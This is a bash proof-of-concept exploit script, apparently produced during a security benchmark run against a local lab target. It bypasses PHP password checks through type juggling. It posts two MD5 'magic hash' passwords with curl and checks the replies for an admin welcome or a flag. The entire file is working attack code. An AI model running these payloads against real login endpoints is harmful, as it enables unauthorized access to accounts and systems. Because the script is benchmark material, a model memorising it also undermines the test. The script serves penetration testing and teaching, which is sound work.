#!/bin/bash
# POC: Demonstrates PHP type juggling weak comparison authentication bypass using magic hash values
# Target: ./repo
# Created: 2025-11-07T16:46:37.578Z
# Session: benchmark-XBEN-060-24-mhp2yh9y

# PHP Type Juggling Authentication Bypass POC
# Demonstrates exploitation of weak == comparison with MD5 magic hashes
# Target: Password authentication endpoint using weak comparison
# Payload: Magic hash values where MD5 produces 0e[digits] format

TARGET_URL="${1:-http://localhost:80/index.php}"

echo "================================================================"
echo "PHP Type Juggling Weak Comparison Authentication Bypass POC"
echo "================================================================"
echo "Target: $TARGET_URL"
echo ""

# Magic hash payload 1: "0e215962017"
# MD5("0e215962017") = 0e291242476940776845150308577824
# In PHP: 0e... == 0e... => true (both treated as 0)
PAYLOAD1="0e215962017"

echo "[*] Testing Magic Hash Payload 1: $PAYLOAD1"
echo "[*] Expected MD5: 0e291242476940776845150308577824"
echo "[*] Type Juggling: 0e... equals 0 in PHP weak comparison (==)"
echo ""

RESPONSE1=$(curl -s -X POST "$TARGET_URL" -d "password=$PAYLOAD1")

echo "[+] Response from first attempt:"
echo "$RESPONSE1"
echo ""

# Check if authentication was successful
if echo "$RESPONSE1" | grep -q "Welcome Admin\|flag\|Congratulations"; then
    echo "[SUCCESS] Authentication bypass successful with payload: $PAYLOAD1"
    echo "[+] Weak comparison vulnerability confirmed!"
    exit 0
fi

# Try magic hash payload 2: "240610708"
# MD5("240610708") = 0e462097431906509019562988736854
PAYLOAD2="240610708"

echo "[*] Testing Magic Hash Payload 2: $PAYLOAD2"
echo "[*] Expected MD5: 0e462097431906509019562988736854"
echo ""

RESPONSE2=$(curl -s -X POST "$TARGET_URL" -d "password=$PAYLOAD2")

echo "[+] Response from second attempt:"
echo "$RESPONSE2"
echo ""

# Check if authentication was successful
if echo "$RESPONSE2" | grep -q "Welcome Admin\|flag\|Congratulations"; then
    echo "[SUCCESS] Authentication bypass successful with payload: $PAYLOAD2"
    echo "[+] Weak comparison vulnerability confirmed!"
    exit 0
fi

# If both failed, show diagnostic info
echo "[!] Both payloads failed. Checking application response..."
echo "[*] This may indicate the vulnerability is not present or the endpoint differs."
exit 1